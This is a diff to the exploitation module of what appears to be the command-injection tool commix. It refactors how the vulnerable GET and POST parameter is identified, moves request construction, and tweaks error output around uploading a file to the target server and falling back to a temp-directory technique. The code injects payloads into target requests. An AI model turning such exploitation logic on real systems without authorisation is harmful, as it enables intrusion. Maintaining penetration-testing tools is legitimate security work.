@@ -136,17 +136,12 @@ def exploitation(url,delay,filename,http_request_method):
 		# Check if its not specified the 'INJECT_HERE' tag
 		url = parameters.do_GET_check(url)
 		
-		# Define the vulnerable parameter
-		if re.findall(r"&(.*)="+settings.INJECT_TAG+"", url):
-		  vuln_parameter = re.findall(r"&(.*)="+settings.INJECT_TAG+"", url)
-		  
-		elif re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url):
-		  vuln_parameter = re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url)
-		  
-		else:
-		  vuln_parameter = url
-
+		# Encoding non-ASCII characters payload.
 		payload = urllib.quote(payload)
+		
+		# Define the vulnerable parameter
+		vuln_parameter = parameters.vuln_GET_param(url)
+		
 		target = re.sub(settings.INJECT_TAG, payload, url)
 		request = urllib2.Request(target)
 		
@@ -176,20 +171,12 @@ def exploitation(url,delay,filename,http_request_method):
 		# Check if its not specified the 'INJECT_HERE' tag
 		parameter = parameters.do_POST_check(parameter)
 		
+		# Define the POST data
 		data = re.sub(settings.INJECT_TAG, payload, parameter)
+		request = urllib2.Request(url, data)
 		
 		# Define the vulnerable parameter
-		if re.findall(r"&(.*)="+settings.INJECT_TAG+"", url):
-		  vuln_parameter = re.findall(r"&(.*)="+settings.INJECT_TAG+"", url)
-		  
-		elif re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url):
-		  vuln_parameter = re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url)
-		  
-		else:
-		  vuln_parameter = parameter
-		
-		vuln_parameter = ''.join(vuln_parameter)
-		request = urllib2.Request(url, data)
+		vuln_parameter = parameters.vuln_POST_param(parameter,url)
 		
 		# Check if defined extra headers.
 		headers.do_check(request)
@@ -228,8 +215,8 @@ def exploitation(url,delay,filename,http_request_method):
 	      except urllib2.HTTPError, e:
 		  if e.getcode() == 404:
 		    stop_injection = True
-		    print colors.RED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '" + settings.SRV_ROOT_DIR + "'." + colors.RESET
-		    sys.stdout.write("(*) Trying to upload the "+ OUTPUT_TEXTFILE +" on temporary directory (" + settings.TMP_DIR + ")...\n")
+		    print colors.BOLD + colors.RED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '" + settings.SRV_ROOT_DIR + "'." + colors.RESET
+		    sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on temporary directory (" + settings.TMP_DIR + ")...\n")
 		    tempfile_based.exploitation(url,delay,filename,http_request_method)     
 		    sys.exit(0)
 		    
